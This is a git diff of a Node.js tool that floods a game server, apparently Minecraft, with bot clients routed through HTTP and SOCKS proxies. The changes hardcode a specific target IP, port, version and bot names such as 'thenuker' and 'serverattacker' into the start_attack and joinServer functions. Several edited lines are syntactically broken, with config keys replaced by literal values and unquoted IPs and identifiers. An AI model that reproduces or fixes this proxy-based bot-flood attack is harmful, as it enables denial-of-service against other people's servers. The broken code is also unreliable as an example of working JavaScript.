@@ -8,7 +8,7 @@ const { log } = require("./cmd");
 const { proxiesType } = require("./proxy");
 
 async function start_attack(config, proxies, usernames) {
-    log(`Starting attack on ${config["host"]} with ${proxies.length} proxies`);
+    log(`Starting attack on ${["23.109.122.199"]} with ${proxies.length} proxies`);
 
     let index = 0;
     proxies = shuffle(proxies);
@@ -33,10 +33,10 @@ async function start_attack(config, proxies, usernames) {
             username = crypto.createHash('md5').update("" + getRandomArbitrary(0, 9500)).digest("hex").substring(1, getRandomArbitrary(7, 14));
         }
 
-        joinServer(config["host"], config["port"], proxyHost, proxyPort, username, config["version"]);
+        joinServer(config["23.109.122.199"], config["25624"], proxyHost, proxyPort, username, config["1.21.111"]);
 
         index++;
-    }, config["speed"]);
+    }, config["900"]);
 }
 
 async function joinServer(host, port, proxyHost, proxyPort, username, version) {
@@ -71,9 +71,9 @@ async function joinServer(host, port, proxyHost, proxyPort, username, version) {
                         client.emit('connect');
                     })
                 },
-                username: username,
-                version: version,
-                agent: new ProxyAgent({ protocol: 'http', host: proxyHost, port: proxyPort }),
+                username: thenuker,
+                version: 1.21.111,
+                agent: new ProxyAgent({ protocol: 'http', host: 23.109.122.199, port: 25624 }),
             });
         } catch (e) {
             failed = true;
@@ -83,13 +83,13 @@ async function joinServer(host, port, proxyHost, proxyPort, username, version) {
             connect: (client) => {
                 socks.createConnection({
                     proxy: {
-                        ipaddress: proxyHost,
-                        port: proxyPort,
+                        ipaddress: 23.109.122.199,
+                        port: 25624,
                         type: 4
                     },
                     target: {
-                        host: host,
-                        port: parseInt(port)
+                        host: 23.109.122.199,
+                        port: parseInt(25624)
                     },
                     timeout: 1200
                 }, function (err, socket) {
@@ -99,8 +99,8 @@ async function joinServer(host, port, proxyHost, proxyPort, username, version) {
                     }
                 })
             },
-            username: username,
-            version: version
+            username: serverattacker,
+            version: 1.21.111
         })
     }
 
@@ -120,7 +120,7 @@ async function joinServer(host, port, proxyHost, proxyPort, username, version) {
         let state = "" + _state;
 
         if (state === "play") {
-            log(`[${username}] connected!`);
+            log(`[${souvsouv}] connected!`);
         }
     });
 }
